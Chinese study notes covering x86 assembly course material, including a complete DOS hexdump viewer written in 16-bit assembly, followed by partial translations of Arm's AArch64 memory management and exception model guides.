imul eax,ebx,3	;eax=ebx*3	②
</code></pre>
<p>①②中第二个操作数可以使用寄存器或者变量,②中第三个操作数一定是常数</p>
<ol start="3">
<li>
<p>DIV指令
无符号除法指令div
操作数为8位（二进制）：ax除以操作数，商放在al中，余数放在ah中
操作数为16位（二进制）：dx:ax除以操作数，商放在ax中，余数放在dx中
操作数为32位（二进制）：edx:eax除以操作数，商放在eax中，余数放在edx中
不难发现,这里是很可能溢出的。除法溢出会引发优先级高的内中断.安全起见,用高位的除法.如7FFF FFFFh / 10h
mov eax,7FFFFFFFh
xor edx,edx	;高位清零
mov ebx,10h
div ebx</p>
</li>
<li>
<p>push/pop
push和pop后面不可以跟一个8位的寄存器或变量.
push和pop后面可以跟常数了	.386特性</p>
</li>
<li>
<p>FL升级为EFL,如果要把EFL压入堆栈要用pushfd,相应的有popfd</p>
</li>
</ol>
<h4 id="小数指令80387现在已经基本被淘汰了"><a class="header" href="#小数指令80387现在已经基本被淘汰了">小数指令80387，现在已经基本被淘汰了</a></h4>
<p>pi dd 3.14	;相当于C语言的float	%f
r dq 3.14159	;相当于double		%lf
s dt 3.1415926	;相当于long double	%Lf tbyte ptr
result dd 0</p>
<p>小数寄存器st(0),st(1)...st(7),80 bits
例子:</p>
<pre><code>	fld pi		;把pi加载到st(0)	;这里不用 xxx ptr,可能是编译器自动识别吧
	fld r		;把r加载到st(0),pi被挤到st(1),好迷惑的操作
	fmul st,st(1)	;st(0)*=st(1)
	fstp result	;把st(0)的内容弹出到result
	fstp st		;我弹我自己,把栈清空
</code></pre>
<p>fild x	:把x里面的整数转换成浮点数再载入
fadd，fsub，fmul，fdiv 顾名思义</p>
<p>intel的新的浮点数指令集:
mmx:multi-media extention
sse:streaming simd extention
avx:advanced vector extension
simd:single instruction multi-data
avx512:</p>
<h5 id="除法溢出"><a class="header" href="#除法溢出">除法溢出</a></h5>
<p>(1) div 0 
(2) 除以一个较小的数,存不下
发生除法溢出,CPU会在div的前面执行int 00h指令</p>
<h3 id="函数参数传递的方式"><a class="header" href="#函数参数传递的方式">函数参数传递的方式</a></h3>
<p>(1)寄存器传递	系统调用	线程切换时,系统会保存寄存器的值
(2)变量传递	用(2),函数不能重入(reentrant),即不支持多线程.
(3)堆栈传递★
1.__cdecl	C语言的堆栈传递法,从右到左压入堆栈.由调用者负责清理堆栈.也就是上面提到的函数编写范式。个人觉得好。
2.__pascal	从左到右压入堆栈,由被调用者负责清理堆栈
3.__stdcall	WINDOWS API常用,参数从右到左压入堆栈,由被调用者清理堆栈
需要用栈帧bp,见上
可变参数个数函数,需要根据第n个参数推断出参数的个数(n为定值)
int f(int i,...);</p>
<p>局部变量内存开辟：栈；
其他信息：栈
返回值：EAX、AX，AL</p>
<!--思考一下返回值不在栈里怎么实现递归程序 -->
<h3 id="混合语言编程"><a class="header" href="#混合语言编程">混合语言编程</a></h3>
<p>可以用于逆向工程或者硬件编程
把别人的.exe改造成.dll动态链接库,再把他的某个函数导出(命名)或直接调用相对地址.就可以在自己的程序里使用.
在调用他人 class中的成员函数时,用汇编
(1)C源代码嵌入汇编指令</p>
<pre><code>    在tc中,在汇编指令前面加上asm
	在vc中,
	__asm
	{
		汇编代码
	}
	在vc中一个汇编函数
	__declspec(naked) int f(int a,int b)	;这个naked是禁止生成堆栈框架 ebp 左边这个可以算伪指令吧,给编译器用的
	{
		__asm
		{
			汇编函数范式
		}
	}
	在命令行通过tcc filename 编译
</code></pre>
<p>(2)把.c和.asm分别编译成.obj,再通过Link生成.exe可执行文件
在白老师主页的asm_c.txt</p>
<h3 id="怎么找c语言的main"><a class="header" href="#怎么找c语言的main">怎么找C语言的main</a></h3>
<p>C语言main的特征:push push push call</p>
<pre><code>    int main(int argc,char *argv[],char *env[])
	{
	}
	;env[i]指向诸如path这样的信息,前两个是参数个数和参数地址
</code></pre>
<p>如果自己写,可以用int 3插个眼,直接执行调试器会停在int 3
int 3,机器码CC,就是调试器的断点的原理.
会把断点处机器码的第一个字节改成CC,执行的时候恢复原状,顺利执行后再改回CC
但是你在调试器里是看不出来的</p>
<h3 id="32位系统下的远调用"><a class="header" href="#32位系统下的远调用">32位系统下的远调用</a></h3>
<p>call far ptr 或 call fword ptr
16位
call far ptr 或 call dword ptr</p>
<h3 id="缓冲区溢出"><a class="header" href="#缓冲区溢出">缓冲区溢出</a></h3>
<p>可以利用不检查边界的strcpy修改返回地址
在白老师主页的overflow.cpp</p>
<h3 id="asm_sumdoc-考试重点"><a class="header" href="#asm_sumdoc-考试重点">asm_sum.doc 考试重点</a></h3>
<h2 id="hexdump-reader"><a class="header" href="#hexdump-reader">hexdump reader</a></h2>
<p>突然看到了这个东西，当时写了好久的时间。
功能是读取一个文件的二进制，用键盘翻页，Intel80386汇编(还是8086?)
版权所有，未经允许禁止在任何场合使用以下代码。</p>
<pre><code>.386
;相当于c语言中的#define
PageUp 	 = 4900h
PageDown = 5100h
Home 	 = 4700h
_End 	 = 4F00h
_Esc 	 = 011Bh

data segment use16
filename 	 db 100, ?, 100 dup(0)
buf 	   	 db 256 dup(0)
handle		 dw 0
bytes_in_buf dw 0
file_size	 dd 0
_offset		 dd 0
n			 dd 0
sentence1	 db &quot;Please input filename:&quot;, '$'
sentence2	 db &quot;Cannot open file!&quot;, '$'
t			 db &quot;0123456789ABCDEF&quot;
s			 db &quot;00000000: xx xx xx xx|xx xx xx xx|xx xx xx xx|xx xx xx xx  ................&quot;
pattern		 db &quot;00000000:            |           |           |                             &quot;
data ends
code segment use16
assume cs:code, ds:data

char_hex:		;把8位数转化成16进制格式
	push ax
	push di
	push si
	mov ax, data
	mov ds, ax
	push bp
	mov bp, sp
	mov si, [bp+10]
	mov ax, [bp+12]
	shr ax, 4
	and al, 0Fh
	mov ah, 0
	mov di, ax
	mov al, t[di]
	mov byte ptr ds:[si], al
	inc si
	mov ax, [bp+12]
	and al, 0Fh
	mov ah, 0
	mov di, ax
	mov al, t[di]
	mov byte ptr ds:[si], al
	pop bp
	pop si
	pop di
	pop ax
	ret 4
	
long_hex:		;把32位数转化成16进制格式
	push eax
	push cx
	
	mov eax, _offset
	mov cx, 0
convert:
	rol eax, 8		;循环左移8位, 把高8位移到低8位
	push eax		; 保存此时的_offset
	and eax, 0FFh	;高24位置0, 保留低8位
	push ax			; char2hex函数的第一个参数
	mov ax, offset s
	add ax, cx
	add ax, cx
	push ax			; char2hex函数的第二个参数
	
	call char_hex	;把8位数转化成16进制格式
	
	pop eax
	inc cx
	cmp cx, 4	; 共循环4次
	jb convert
	pop cx
	pop eax
	ret
	
show_this_row:
	; i -&gt; cx   for循环的上界 -&gt; bx
	push ax
	push bx
	push cx
	push si
	push di

; 复制字符串
	mov ax, data
	mov ds, ax
	mov si, offset pattern
	mov es, ax
	mov di, offset s
	mov cx, 75		; pattern 共有75个字符
	cld
	rep movsb
	
	call long_hex	;把32位偏移地址转化成16进制格式填入s左侧8个'0'处
	
	push bp
	mov bp, sp
	mov bx, [bp+22]
	cmp bx, 0
	je for2
	
	mov cx, 0
for1:
	mov ax, offset s + 10
	add ax, cx
	add ax, cx
	add ax, cx
	push ax		; char2hex函数的第二个参数
	
	mov di, cx
	mov ax,  word ptr buf[di]
	push ax		; char2hex函数的第一个参数
	call char_hex
	
	inc cx
	cmp cx, bx
	jb for1
for2:
	mov ax, data
	mov ds, ax
	mov si, offset buf
	mov es, ax
	mov di, offset s + 59
	mov cx, bx
	cld
	rep movsb
	
;计算s数组的长度
	mov ax, data
	mov es, ax
	mov di, offset s	; ES:DI目标串
	mov cx, 0FFFFh		; CX=最多找FFFF次
	mov al, 0			; AL=待找的字符(0表示字符串结束)
	cld       			; DF=0，表示正方向
	repne scasb			; again:
	not cx				; 相当于cx=FFFF-cx
	sub cx, 2			; 因为此处求sizeof(s)-1，故直接sub2
	mov bx, cx
	cmp bx, 0
	je finished
	push bx				; 保存bx
	mov cx, 0
	
	mov ax, 0B800h
	mov es, ax
	mov ax, [bp+14]		; 行号
	mov di, 80*2
	mul di
	mov bx, ax			; bx = row*80*2
for3:
	mov si, cx
	mov al, s[si]
	mov di, si
	add di, di
	cmp cx, 59
	jnb white
	cmp al, '|'
	jne white
	mov ah, 0Fh
	jmp output
white:
	mov ah, 07h
output:
	mov word ptr es:[bx+di], ax
	inc cx
	pop bx
	cmp cx, bx
	jb for3
finished:	
	pop bp
	pop di
	pop si
	pop cx
	pop bx
	pop ax
	ret 10
	
clear_this_page:	;清除屏幕0~15行
	push ax
	push es
	push di
	push cx
	mov ax, 0B800h
	mov es, ax
	mov di, 0
	mov cx, 80*16	 ;汇编中可以使用rep stosw填入80*16个0020h
	cld
	mov ax, 0020h
	rep stosw
	
	pop cx
	pop di
	pop es
	pop ax
	ret
	
show_this_page:
	;  i -&gt; cx   rows -&gt; ax  bytes_on_row -&gt; bx
	push ax
	push bx
	push cx
	push dx
	push si
	call clear_this_page
	push bp
	mov bp, sp
	mov ax, bytes_in_buf
	add ax, 15
	shr ax, 4		; 相当于除以16
	cmp ax, 0
	je done
	mov cx, 0
loop1:
	push ax		; 保存ax的值（rows）
	mov ax, cx
	mov si, 16
	mul si		; DX:AX=AX*SI 而且此处可以确保dx=0
	mov dx, ax	; dx存放cx*16的值，还会多次用到，因此比较方便
	pop ax
	dec ax		; 为了比较cx和ax-1
	cmp cx, ax
	jne not_last_row
	mov bx, bytes_in_buf
	sub bx, dx
	jmp ok
not_last_row:
	mov bx, 16		
ok:	
	inc ax ;   将ax恢复原值（开始在比较cx和ax-1的时候把ax减了一的）
	push ax			; 保存此时ax的值（存放循环上限）
	
	push bx			; show_this_row函数的第四个参数
	lea ax, buf
	add ax, dx
	push ax			; show_this_row函数的第三个参数
	mov eax, _offset
	adc ax, dx		; 可能有溢出的问题？
	push eax		; show_this_row函数的第二个参数
	push cx			; show_this_row函数的第一个参数
	call show_this_row
	
	pop ax	;  弹出ax（作为循环上界）
	cmp cx, ax
	jb loop1
done:
	pop bp
	pop si
	pop dx
	pop cx
	pop bx
	pop ax
	ret 8


main:
	mov ax, data
	mov ds, ax
	
	mov ah, 9
	mov dx, offset sentence1
	int 21h				; 输出字符串sentence1：&quot;Please input filename:&quot;
	
	mov ah, 0Ah
	mov dx, offset filename
	int 21h				;输入文件名

;打开文件，返回句柄
	mov ah, 3Dh
    mov al, 0; 对应_open()的第2个参数, 表示只读方式
    mov bh,0
    mov bl, filename[1]
    mov filename[bx],0
    mov dx, offset filename+2
    int 21h
    mov handle, ax
		
	
	jnc open_success	;汇编中可以通过检查CF==1来判断上述打开文件有否成功
	mov ah, 9
	mov dx, offset sentence2
	int 21h				;输出字符串sentence2:&quot;Cannot open file!&quot;
;以下语句相当于c语言中的exit(0)
	mov ah, 4Ch
    mov al, 0; 对应exit()中的参数
    int 21h
open_success:
;移动文件指针
	mov ah, 42h
    mov al, 2; 对应lseek()的第3个参数,
             ; 表示以EOF为参照点进行移动
    mov bx, handle
    mov cx, 0; \ 对应lseek()的第2个参数
    mov dx, 0; /
    int 21h
    mov word ptr file_size[2], dx
    mov word ptr file_size[0], ax
	
	mov _offset, 0
again:
	mov eax, file_size
	sub eax, _offset
	mov n, eax
	cmp n, 256
	jb other
	mov bytes_in_buf, 256
	jmp mfp
other:
	mov eax, n
	mov bytes_in_buf, ax ;  由于此情况下n&lt;256，因此eax的高十六位一定是0
mfp:
;移动文件指针
    mov ah, 42h
    mov al, 0; 对应lseek()的第3个参数,
             ; 表示以偏移0作为参照点进行移动
    mov bx, handle
    mov cx, word ptr _offset[2]; \cx:dx合一起构成
    mov dx, word ptr _offset[0]; /32位值=_offset
    int 21h

;读取文件中的bytes_in_buf个字节到buf中 
    mov ah, 3Fh
    mov bx, handle
    mov cx, bytes_in_buf
    mov dx, data
    mov ds, dx
    mov dx, offset buf
    int 21h

	call show_this_page

;键盘输入
    mov ah, 0
    int 16h		; 返回值AX=键盘的编码
	push ax		; 保存ax的值（key）
	cmp ax, PageUp
	je casePageUp
	cmp ax, PageDown
	je casePageDown
	cmp ax, Home
	je caseHome
	cmp ax, _End
	je caseEnd
	jmp exit
casePageUp:
	sub _offset, 256
	cmp _offset, 0
	jb zero
	jmp exit
zero:
	mov _offset, 0
	jmp exit
casePageDown:
	add _offset, 256
	mov eax, file_size	; eax存放file_size的值
	cmp _offset, eax
	jb addtion
	sub _offset, 256	; 还原_offset的原值
	jmp exit
addtion:
	jmp exit
caseHome:
	jmp zero		; 这里要进行的操作和zero对应的操作正好一样
caseEnd:
	mov _offset, eax
	push eax		;  保存file_size的值
	and eax, 255	;  file_size = file_size % 256
	sub _offset, eax
	pop eax
	cmp _offset, eax
	je subtraction
	jmp exit
subtraction:
	mov _offset, eax
	sub _offset, 256
exit:
	pop ax			; 弹出ax（key）
	cmp ax, _Esc	; 循环条件
	jne again

;关闭文件
	mov ah, 3Eh			
    mov bx, handle
    int 21h
	mov ah, 4Ch
	int 21h
code ends
end main
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="architecture"><a class="header" href="#architecture">Architecture</a></h1>
<p>浙江大学硬件三连：数字逻辑+计算机组成+计算机体系结构的课堂笔记。</p>
<p>以及ARMv8手册的一些翻译。</p>
<p>记得比较一般，仅供自己参考。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="aarch64-memory-management"><a class="header" href="#aarch64-memory-management">AArch64 memory management</a></h1>
<p>原文链接 https://developer.arm.com/documentation/101811/0102/Overview</p>
<h2 id="overview-1"><a class="header" href="#overview-1">Overview</a></h2>
<p>略</p>
<h2 id="what-is-memory-management"><a class="header" href="#what-is-memory-management">What is memory management?</a></h2>
<p>内存管理描述了如何控制对系统中内存的访问。每次操作系统或应用程序访问内存时，硬件都会执行内存管理。内存管理是一种为应用程序动态分配内存区域的方法。</p>
<h3 id="why-is-memory-management-needed"><a class="header" href="#why-is-memory-management-needed">Why is memory management needed?</a></h3>
<p>为了支持虚拟内存。略。</p>
<h2 id="virtual-and-physical-addresses"><a class="header" href="#virtual-and-physical-addresses">Virtual and physical addresses</a></h2>
<p>使用虚拟地址的好处是允许类似操作系统这样的管理程序，控制提供给软件的内存视图。操作系统可以控制哪些内存是可见的，可见的内存的虚拟地址，对一块内存允许何种形式的访问（比如读写执行）。这允许操作系统对应用程序进行沙箱处理（对另一个应用程序隐藏一个应用程序的资源）并提供对底层硬件的抽象。</p>
<p>一个使用虚拟地址的好处是，操作系统可以将内存的多个碎片物理区域作为单个连续的虚拟地址空间呈现给应用程序。</p>
<p>虚拟地址也有利于软件开发人员，他们在编写应用程序时不会知道系统的确切内存地址。有了虚拟地址，软件开发人员就不需要关心物理内存了。应用程序知道操作系统和硬件会帮他做好物理地址的管理。</p>
<p>实际上，每个应用程序都可以使用自己的一组虚拟地址，这些地址将映射到物理系统中的不同位置。当操作系统在不同的应用程序之间切换时，它会重新建立虚拟地址到物理地址的映射。这意味着当前应用程序的虚拟地址将映射到内存中正确的物理位置。</p>
<p>虚拟地址到物理地址的映射存储在translation tables(也叫page tables)中。如下</p>
<p><img src="Basic/Architecture/../images/627cb409c20acc56309817a4.png" alt="显示虚拟地址和物理地址的图表" /></p>
<p>Translation Table在内存中，由软件管理，通常是操作系统或管理程序。Translation Table不是静态的，并且可以随着软件变化的需要而更新表。这改变了虚拟地址和物理地址之间的映射。</p>
<h2 id="the-memory-management-unit-mmu"><a class="header" href="#the-memory-management-unit-mmu">The Memory Management Unit (MMU)</a></h2>
<p>MMU负责完成虚拟地址到物理地址的映射。MMU包括：</p>
<ul>
<li>Table walk unit。他会读取内存中的translation table。</li>
<li>Translation Lookaside Buffers (TLBs)。他会缓存最近使用的转换。</li>
</ul>
<p>所有的软件发起的内存访问，用的地址<strong>都是虚拟地址</strong>。地址被传递给MMU，MMU检查TLB是否有缓存，如果没有的话遍历内存中的页表。</p>
<p>在内存访问之前，一个虚拟地址一定要被转化成一个物理地址。这种转换需求也适用于缓存数据，因为在 Armv6 和更高版本的处理器上，数据缓存使用物理地址（物理标记的地址）存储数据。因此，必须先翻译地址，然后才能完成高速缓存查找。</p>
<h3 id="table-entry"><a class="header" href="#table-entry">Table entry</a></h3>
<p>略</p>
<h2 id="address-space"><a class="header" href="#address-space">Address Space</a></h2>
<p>AArch64 中有几个独立的虚拟地址空间。此图显示了这些虚拟地址空间：</p>
<p><img src="Basic/Architecture/../images/627cb409c20acc563098179c.png" alt="Armv8-A 中的地址空间" /></p>
<p>这张图展示了三个虚拟地址空间</p>
<ul>
<li>Non-secure EL0 and EL1.</li>
<li>Non-secure EL2.</li>
<li>EL3.</li>
</ul>
<p>每个虚拟地址空间都是互相独立的，有他们自己的设置和页表。我们通常称这些设置和页表为&quot;translation regimes&quot;。除了上面展示的三种，还有Secure EL0, Secure EL1, Secure EL2三个虚拟地址空间。</p>
<p>因为有很多的虚拟地址空间，我们需要区分地址是在哪个地址空间的。比如，<code>DS.EL2:0x8000</code>表示在Non-secure EL2虚拟地址空间的地址0x8000。</p>
<p>这张图还表明了，在Non-Secure EL0和 Non-Secure EL1的虚拟地址的翻译，需要经过两张套表。这些表支持虚拟化并允许管理程序虚拟化由虚拟机 (VM) 看到的物理内存视图。</p>
<p>Armv9-A支持上面所有提到的Armv8-A的虚拟地址空间。此外还引入了可选的Realm Management Extension (RME).实施 RME 时，还存在其他翻译机制：</p>
<ul>
<li>Realm EL1 and EL0</li>
<li>Realm EL2 and EL0</li>
<li>Realm EL2</li>
</ul>
<p>在虚拟化中，我们将由操作系统控制的转换集称为 Stage 1。Stage 1 表将虚拟地址转换为中间物理地址 (IPA)。在第一阶段，操作系统认为 IPA 是物理地址空间。但是，管理程序控制第二组转换，我们称之为阶段 2。第二组转换将 IPA 转换为物理地址。此图显示了两组翻译的工作方式：</p>
<p><img src="Basic/Architecture/../images/627cb409c20acc563098179b.png" alt="第 2 阶段 IPA 到物理地址" /></p>
<h3 id="physical-addresses"><a class="header" href="#physical-addresses">Physical Addresses</a></h3>
<p>除了多个虚拟地址空间，AArch64 还有多个物理地址空间（PAS）：</p>
<ul>
<li>Non-secure PAS0</li>
<li>Secure PAS</li>
<li>Realm PAS (Armv9-A only)</li>
<li>Root PAS (Armv9-A only)</li>
</ul>
<p>虚拟地址可以映射到哪个或多个物理地址空间取决于处理器的当前安全状态。以下列表显示了安全状态及其对应的虚拟地址映射目标：</p>
<ul>
<li>Non-secure state：虚拟地址只能映射到非安全物理地址。</li>
<li>Secure state：虚拟地址可以映射到安全或非安全物理地址。</li>
<li>Realm state：虚拟地址可以映射到领域或非安全物理地址</li>
<li>Root state：虚拟地址可以映射到任何物理地址空间。</li>
</ul>
<p><img src="Basic/Architecture/../images/627cb409c20acc5630981799.png" alt="多个物理地址空间的映射" /></p>
<h3 id="地址大小"><a class="header" href="#地址大小">地址大小</a></h3>
<p>AArch64 是 64 位架构，但这并不意味着所有地址都是 64 位的。</p>
<p>略</p>
<h2 id="页表格式"><a class="header" href="#页表格式">页表格式</a></h2>
<ul>
<li><a href="https://armv8-ref.codingbelief.com/en/chapter_d4/d43_vmsav8-64_translation_table_format_descriptors.html#">VMSAv8-64 translation table level 0, level 1, and level 2 descriptor formats</a>.</li>
<li><a href="https://armv8-ref.codingbelief.com/en/chapter_d4/d43_vmsav8-64_translation_table_format_descriptors.html#">ARMv8 translation table level 3 descriptor formats on page D4-1698</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="arm中的寄存器"><a class="header" href="#arm中的寄存器">ARM中的寄存器</a></h1>
<h2 id="system寄存器"><a class="header" href="#system寄存器">System寄存器</a></h2>
<p>TTBR系列，页表基地址系列，类比RISC-V的<code>satp</code>。里面存的是什么地址？？</p>
<div class="table-wrapper"><table><thead><tr><th>寄存器名</th><th>简单描述</th><th>详细描述</th></tr></thead><tbody>
<tr><td>TTBR0_EL1</td><td>用户空间Stage1页表基地址</td><td>Holds the base address of the translation table for the initial lookup for stage 1 of the translation of an address from the lower VA range in the EL1&amp;0 translation regime, and other information for this translation regime.</td></tr>
<tr><td>TTBR1_EL1</td><td>内核空间Stage1页表基地址</td><td></td></tr>
</tbody></table>
</div>
<p>ELR系列，Exception Level返回地址，类比RISC-V的<code>sepc</code>。</p>
<div class="table-wrapper"><table><thead><tr><th>寄存器名</th><th>简单描述</th><th>详细描述</th></tr></thead><tbody>
<tr><td>ELR_EL1</td><td>EL1 ERET返回地址</td><td></td></tr>
</tbody></table>
</div>
<p>ID_AA64MMFR0_EL1</p>
<p>TCR_EL系列，Translation Control Register，类比RISC-V的<code>satp</code>的高位。</p>
<ul>
<li>TG1，描述了页表使用的粒度是4KB/16KB/64KB。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="aarch64-exception-model"><a class="header" href="#aarch64-exception-model">AArch64 Exception Model</a></h1>
<p>原文链接：https://developer.arm.com/documentation/102412/0102/Privilege-and-Exception-levels</p>
<h2 id="1-overview"><a class="header" href="#1-overview">1 Overview</a></h2>
<p>本指南介绍 Armv8-A 和 Armv9-A 中的异常和特权模型。本指南涵盖了 Arm 架构中不同类型的异常，以及处理器在收到异常时的行为。</p>
<p>本指南适用于底层代码的开发人员，例如引导代码或驱动程序。</p>
<h2 id="2-privilege-and-exception-levels"><a class="header" href="#2-privilege-and-exception-levels">2 Privilege and Exception levels</a></h2>
<p>Arm的权限等级，只能在发生Exception，或者从Exception返回的时候才能改变。所以<strong>Privilege Level</strong>又叫<strong>Exception Level(EL)</strong>。</p>
<p>异常等级叫做<code>EL&lt;x&gt;</code>，x在0到3之间。数字越大代表权限越高。</p>
<p><img src="Basic/Architecture/../images/6274ea357e121f01fd22f19a.png" alt="Exception levels" /></p>
<p>通常EL0运行用户程序，EL1运行操作系统，EL2运行hypervisor，EL3为低级的固件和安全代码保留。这并不是强制的，但是算是约定俗成的。</p>
<h3 id="types-of-privilege"><a class="header" href="#types-of-privilege">Types of privilege</a></h3>
<p>有两种权限的种类。他们都被当前的权限等级影响。</p>
<ol>
<li>内存系统中的权限</li>
<li>获取处理器资源的权限。</li>
</ol>
<h3 id="memory-privilege"><a class="header" href="#memory-privilege">Memory Privilege</a></h3>
<p>Arm 架构的 A-profile 实现了一个虚拟内存系统，其中的<strong>MMU</strong>允许软件将属性分配给内存区域，比如read/write permission。这种配置允许 <strong>privileged access</strong> 和 <strong>unprivileged access</strong>的单独访问权限。</p>
<p>在EL0权限的内存访问将进行unprivileged access权限检查，EL1, EL2, EL3权限的内存访问将进行privileged access权限检查。</p>
<p>因为这个memory configuration，是由软件通过修改 MMU的转换表（页表）决定的。因此您应该考虑对这些表进行编程所需的特权。memory configuration保存在<strong>System registers</strong>中，访问System registers的能力受当前的权限控制。</p>
<h3 id="register-access"><a class="header" href="#register-access">Register Access</a></h3>
<p>ARMv8-A 处理器的 Conﬁguration settings 保存在一系列寄存器中，也就是 <strong>System registers</strong>。System registers中的设置组合定义了当前处理器的<strong>Context</strong>，访问System registers的能力受当前的权限控制。</p>
<p>System registers的名字指示了可以访问它的最低的Exception level。比如，<code>TTBR0_EL1</code>寄存器保存了被EL0和EL1使用的<strong>Translation Table</strong>（页表）的基地址，而他不能被EL0访问，否则会造成exception。</p>
<p>ARM架构有许多相似功能的寄存器，它们的名称仅在它们的异常级别后缀上有所不同。他们是相互独立的不同的寄存器，在硬件中有不同的实现，在指令集中有他们自己的编码。比如，下面列出的寄存器负责MMU 不同翻译策略的configuration</p>
<ul>
<li><code>SCTLR_EL1</code> - Top level system control for EL0 and EL1</li>
<li><code>SCTLR_EL2</code> - Top level system control for EL2</li>
<li><code>SCTLR_EL3</code> - Top level system control for EL3</li>
</ul>
<p>高Exception Level可以访问低Exception Level的System register。比如EL2就可以访问<code>SCTLR_EL1</code></p>
<h2 id="3-execution-and-security-states"><a class="header" href="#3-execution-and-security-states">3 Execution and Security states</a></h2>
<p>The current state of an Armv8-A or Armv9-A processor is determined by the <strong>Exception level</strong> and the <strong>current Execution state</strong>.  Current Execution state 定义了通用寄存器的标准宽度和可用的指令集。</p>
<p>Execution state也影响了 memory models和异常的处理。</p>
<p><strong>Current Security State</strong>控制了哪些Exception Levels在当前是合法的，哪些内存是可以访问的，以及这些访问在系统内存总线上的表示方式。</p>
<p>这张图展示了使用了不同的Execution states的Exception Levels和Security states。</p>
<p><img src="Basic/Architecture/../images/6274ea357e121f01fd22f199.png" alt=" Exception levels and Security states using diﬀerent Execution states" /></p>
<h3 id="execution-states"><a class="header" href="#execution-states">Execution states</a></h3>
<p>Armv8-A 有两种可用的 Execution states:</p>
<ul>
<li>AArch32: 32 位Execution states。此状态下的操作与 Armv7-A 兼容。有两个可用的指令集: T32 和 A32。标准寄存器宽度为 32 位。</li>
<li>AArch64: 64 位Execution states。有一个可用的指令集：A64。标准寄存器宽度为 64 位。</li>
</ul>
<p>Armv8-A 处理器在给定的异常级别支持哪些Execution states是由实现定义的。例如：</p>
<ul>
<li>Cortex-A35 在所有Exception Level都支持 AArch32 和 AArch64。</li>
<li>Cortex-A32 仅支持 AArch32。</li>
</ul>
<h3 id="security-state"><a class="header" href="#security-state">Security state</a></h3>
<p>Armv8-A 架构允许实现两种Security state。这允许进一步划分软件以隔离和划分受信任的软件。分别是</p>
<ul>
<li>Secure state: 在这种状态下， Processing Element(PE) 可以访问安全和非安全物理地址空间。在这种状态下，PE 可以访问安全和非安全系统寄存器。在这种状态下运行的软件只能接收安全中断。</li>
<li>Non-secure state: 在这种状态下，PE 只能访问非安全物理地址空间。PE 也只能访问允许非安全访问的系统寄存器。在这种状态下运行的软件只能接收非安全中断。</li>
</ul>
<p>更详细参考：<a href="https://developer.arm.com/architectures/learn-the-architecture/trustzone-for-aarch64">TrustZone for Armv8-A</a></p>
<h3 id="realm-management-extension"><a class="header" href="#realm-management-extension">Realm Management Extension</a></h3>
<p>略</p>
<h3 id="changing-execution-state"><a class="header" href="#changing-execution-state">Changing Execution state</a></h3>
<p>略</p>
<h3 id="changing-security-state"><a class="header" href="#changing-security-state">Changing Security state</a></h3>
<p>略</p>
<h3 id="implemented-exception-levels-and-execution-states"><a class="header" href="#implemented-exception-levels-and-execution-states">Implemented Exception levels and Execution states</a></h3>
<p>略</p>
<h2 id="4-exception-types"><a class="header" href="#4-exception-types">4 Exception Types</a></h2>
<p><strong>Exception</strong>是 任何可以引起当前正在执行的程序suspended，转而去执行异常处理代码 的事件。在其他的架构中这可能叫做Interrupt。在 Armv8-A 和 Armv9-A 中，<strong>Interrupt</strong>是外部引发的Exception。ARM架构将Exception分为两种： synchronous exceptions(同步异常) 和 asynchronous exceptions.(非同步异常)</p>
<h3 id="synchronous-exceptions"><a class="header" href="#synchronous-exceptions">Synchronous exceptions</a></h3>
<p>同步异常是由最近执行的一条指令引起或与之相关的exception。也就是说同步异常和控制流是同步的。</p>
<p>同步异常可能由 execute an invalid instruction(执行非法指令) 引起。有可能是被禁止的指令，也可能是不被当前的Exception Level允许的指令。</p>
<p>同步异常可能由 memory access(内存访问) 引起，可能是不对齐的内存，叶铿是没有通过MMU的权限检查。内存访问也可能引起非同步异常，在后面提及。</p>
<p>ARM还有一系列专门用来产生异常的指令：<code>SVC</code>, <code>HVC</code>, <code>SMC</code>。他们针对不同的Exception Level。他们可以用来实现系统调用，允许低权限的代码向高权限获取服务。</p>
<p>Debug Exception也是同步异常。</p>
<h3 id="asynchronous-exceptions"><a class="header" href="#asynchronous-exceptions">Asynchronous exceptions</a></h3>
<p>某些类型的异常是在外部生成的，因此与当前指令流不同步。这意味着无法准确保证何时会发生异步异常。Armv8-A 架构只要求它在有限的时间内发生。也可以暂时屏蔽非同步异常。这意味着非同步异常可以在处理异常之前处于挂起状态。</p>
<p>非同步异常有下面几种：</p>
<p>物理中断</p>
<ul>
<li>SError (System Error)</li>
<li>IRQ</li>
<li>FIQ</li>
</ul>
<p>虚拟中断</p>
<ul>
<li>vSError (Virtual System Error)</li>
<li>vIRQ (Virtual IRQ)</li>
<li>vFIQ (Virtual FIQ)</li>
</ul>
<p>物理中断是响应 PE 外部产生的信号而产生的。虚拟中断可以由外部产生，也可以由在 EL2 处执行的软件产生。</p>
<h3 id="irq-and-fiq"><a class="header" href="#irq-and-fiq">IRQ and FIQ</a></h3>
<p>Arm 架构有两种异常类型，IRQ 和 FIQ，旨在用于生成外设中断。在旧版本的 Arm 架构中，FIQ 被用作更高优先级的快速中断。这与 Armv8-A 和 Armv9-A 不同，其中 FIQ 与 IRQ 具有相同的优先级。</p>
<p>IRQ 和 FIQ 具有独立的路由控制，通常用于实现安全和非安全中断。</p>
<h3 id="non-maskable-interrupts"><a class="header" href="#non-maskable-interrupts">Non-maskable interrupts</a></h3>
<p>略</p>
<h3 id="serror"><a class="header" href="#serror">SError</a></h3>
<p>略</p>
<h2 id="5-handling-exceptions"><a class="header" href="#5-handling-exceptions">5 Handling exceptions</a></h2>
<p>当异常发送时，当前程序的控制流被中断。PE将会更新current state，并且跳转到vector table中的地址。通常这个地址，保存着保存current state到栈上然后再跳转到进一步处理的程序的代码。</p>
<p><img src="https://documentation-service.arm.com/static/6274ea357e121f01fd22f196?token=" alt="Top level handler" /></p>
<h3 id="exception-terminology"><a class="header" href="#exception-terminology">Exception terminology</a></h3>
<h3 id="taking-an-exception"><a class="header" href="#taking-an-exception">Taking an Exception</a></h3>
<h3 id="routing-asynchronous-exceptions"><a class="header" href="#routing-asynchronous-exceptions">Routing asynchronous exceptions</a></h3>
<h3 id="returning-from-an-exception"><a class="header" href="#returning-from-an-exception">Returning from an exception</a></h3>
<p>在AArch64中，软件可以通过执行<code>ERET</code>指令从异常中返回。这将会导致Exception level返回到<code>SPSR_ELx</code>定义的值，其中的<code>x</code>是当前的Exception Level。<code>SPSR_ELx</code>保存这将要返回到的Exception Level以及Execution State。</p>
